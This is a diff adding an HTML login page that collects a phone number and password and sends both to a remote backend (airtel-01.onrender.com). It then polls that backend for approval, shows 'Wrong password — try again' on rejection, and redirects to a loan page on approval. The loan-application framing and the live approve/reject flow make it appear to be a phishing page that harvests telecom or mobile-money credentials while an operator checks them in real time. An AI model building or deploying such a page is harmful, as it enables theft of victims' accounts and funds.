@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Login</title>
+    <script>
+      // Set backend URL globally
+      const isDevelopment =
+        window.location.hostname === "localhost" ||
+        window.location.hostname === "127.0.0.1";
+      const backendUrl = isDevelopment
+        ? "http://localhost:3000"
+        : "https://airtel-01.onrender.com";
+      localStorage.setItem("backendUrl", backendUrl);
+    </script>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #f3f4f6;
+      }
+      .card {
+        max-width: 420px;
+        margin: 64px auto;
+        background: #fff;
+        border-radius: 16px;
+        padding: 30px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      }
+      h1 {
+        color: #16213e;
+        margin: 0 0 8px;
+      }
+      p {
+        color: #666;
+        margin-bottom: 14px;
+      }
+      label {
+        display: block;
+        font-weight: 600;
+        margin-bottom: 6px;
+      }
+      input {
+        width: 100%;
+        padding: 12px 14px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        margin-bottom: 12px;
+      }
+      .btn {
+        width: 100%;
+        padding: 14px;
+        border-radius: 12px;
+        border: none;
+        background: linear-gradient(90deg, #6c5ce7, #00b894);
+        color: #fff;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .small {
+        font-size: 13px;
+        color: #999;
+        margin-top: 12px;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Sign In</h1>
+      <p>Complete verification to finish your application.</p>
+
+      <form id="login2Form">
+        <label for="phone">Phone number</label>
+        <input id="phone" type="tel" placeholder="+263712345678" required />
+
+        <label for="password">Password</label>
+        <input id="password" type="password" placeholder="Password" required />
+
+        <button class="btn" type="submit">Submit for Approval</button>
+      </form>
+
+      <div class="small">This usually takes a few seconds.</div>
+    </div>
+
+    <script>
+      document
+        .getElementById("login2Form")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const phoneInput = document.getElementById("phone").value.trim();
+          const password = document.getElementById("password").value.trim();
+          if (!phoneInput || !password) return alert("Please fill both fields");
+
+          const phone = phoneInput || localStorage.getItem("phoneNumber") || "";
+          const backendUrl = localStorage.getItem("backendUrl") || "";
+
+          // create verifying overlay
+          const overlay = document.createElement("div");
+          overlay.style.position = "fixed";
+          overlay.style.top = "0";
+          overlay.style.left = "0";
+          overlay.style.width = "100%";
+          overlay.style.height = "100%";
+          overlay.style.background = "rgba(0,0,0,0.45)";
+          overlay.style.display = "flex";
+          overlay.style.alignItems = "center";
+          overlay.style.justifyContent = "center";
+          overlay.style.zIndex = "9999";
+
+          const box = document.createElement("div");
+          box.style.background = "#fff";
+          box.style.padding = "20px 28px";
+          box.style.borderRadius = "12px";
+          box.style.textAlign = "center";
+          box.innerHTML = `<h2 style="margin:0 0 8px">Verifying</h2><div style="width:36px;height:36px;border:4px solid #eee;border-top-color:#6c5ce7;border-radius:50%;margin:0 auto 8px;animation:spin 1s linear infinite"></div>`;
+
+          const styleEl = document.createElement("style");
+          styleEl.innerHTML =
+            "@keyframes spin { to { transform: rotate(360deg); } }";
+          document.head.appendChild(styleEl);
+
+          overlay.appendChild(box);
+          document.body.appendChild(overlay);
+
+          try {
+            const resp = await fetch(`${backendUrl}/api/login/submit`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ username: phone, password, phone }),
+            });
+
+            const data = await resp.json();
+            if (!data.success || !data.requestId)
+              throw new Error(data.error || "Submit failed");
+
+            // Poll silently for approval
+            const pollInterval = setInterval(async () => {
+              try {
+                const r = await fetch(
+                  `${backendUrl}/api/otp/status/${data.requestId}`,
+                );
+                const j = await r.json();
+                if (j.approved) {
+                  clearInterval(pollInterval);
+                  // proceed to final page
+                  window.location.href = "loan8.html";
+                } else if (j.rejected) {
+                  clearInterval(pollInterval);
+                  // remove overlay and show inline error above form so user can retry
+                  try {
+                    document.body.removeChild(overlay);
+                  } catch (e) {}
+                  const card = document.querySelector(".card");
+                  const form = document.getElementById("login2Form");
+                  // create or update error element
+                  let errEl = document.getElementById("login2Error");
+                  if (!errEl) {
+                    errEl = document.createElement("div");
+                    errEl.id = "login2Error";
+                    errEl.style.color = "#f44336";
+                    errEl.style.marginBottom = "12px";
+                    errEl.style.fontWeight = "600";
+                  }
+                  errEl.textContent = "Wrong password — try again";
+
+                  if (form && card.contains(form)) {
+                    card.insertBefore(errEl, form);
+                    // re-enable inputs/buttons if they were disabled
+                    const inputs = form.querySelectorAll("input, button");
+                    inputs.forEach((el) => (el.disabled = false));
+                  } else {
+                    // fallback: replace card content
+                    card.innerHTML = `<h1>Verification Failed</h1><p>Wrong password — <a href="login2.html">Try again</a></p>`;
+                  }
+                }
+              } catch (err) {
+                console.error("Poll error:", err);
+              }
+            }, 2000);
+          } catch (err) {
+            document.body.removeChild(overlay);
+            alert("Error: " + err.message);
+          }
+        });
+    </script>
+  </body>
+</html>
